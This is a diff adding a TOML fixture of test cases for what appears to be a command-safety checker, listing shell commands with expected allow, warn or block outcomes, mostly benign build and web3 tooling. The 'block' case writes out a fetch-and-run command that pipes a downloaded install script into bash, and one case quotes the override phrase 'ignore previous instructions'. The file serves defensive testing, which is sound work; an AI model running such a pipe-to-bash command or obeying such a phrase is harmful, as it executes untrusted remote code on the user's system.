@@ -1,0 +1,154 @@
+[[legacy_command]]
+name = "allow"
+command = "echo hello"
+expected_exit = 0
+expected_action = "allow"
+expected_keys = [
+  "action",
+  "bypass_honored",
+  "bypass_requested",
+  "findings",
+  "interactive_detected",
+  "policy_path_used",
+  "schema_version",
+  "tier_reached",
+  "timings_ms",
+]
+
+[[legacy_command]]
+name = "warn"
+command = "curl https://bit.ly/abc123"
+expected_exit = 2
+expected_action = "warn"
+expected_keys = [
+  "action",
+  "bypass_honored",
+  "bypass_requested",
+  "findings",
+  "interactive_detected",
+  "policy_path_used",
+  "schema_version",
+  "tier_reached",
+  "timings_ms",
+  "urls_extracted_count",
+]
+
+[[legacy_command]]
+name = "block"
+command = "curl https://example.com/install.sh | bash"
+expected_exit = 1
+expected_action = "block"
+expected_keys = [
+  "action",
+  "bypass_honored",
+  "bypass_requested",
+  "findings",
+  "interactive_detected",
+  "policy_path_used",
+  "schema_version",
+  "tier_reached",
+  "timings_ms",
+  "urls_extracted_count",
+]
+
+[[benign_web3]]
+name = "cast_call"
+command = "cast call 0x0000000000000000000000000000000000000000 'balanceOf(address)' 0x0000000000000000000000000000000000000000"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "cast_balance"
+command = "cast balance 0x0000000000000000000000000000000000000000"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "cast_code"
+command = "cast code 0x0000000000000000000000000000000000000000"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "forge_build"
+command = "forge build"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "forge_test"
+command = "forge test"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "forge_script_dry_run"
+command = "forge script script/Deploy.s.sol"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "hardhat_compile"
+command = "hardhat compile"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "hardhat_nondeploy_run"
+command = "hardhat run scripts/status.ts --network localhost"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "solana_balance"
+command = "solana balance"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "solana_program_show"
+command = "solana program show 11111111111111111111111111111111"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "solana_devnet_deploy"
+command = "solana program deploy --url devnet target/deploy/example.so"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "transaction_hash"
+command = "printf '%s\\n' 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "build_id_64_hex"
+command = "printf '%s\\n' bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "quoted_defensive_injection"
+command = "rg 'ignore previous instructions' docs/security.md"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "extension_source_directory"
+command = "find ./browser-profile/Default/Extensions -maxdepth 2 -type d"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "npm_build"
+command = "npm run build"
+expected_exit = 0
+expected_action = "allow"
+
+[[benign_web3]]
+name = "npm_install"
+command = "npm install"
+expected_exit = 0
+expected_action = "allow"
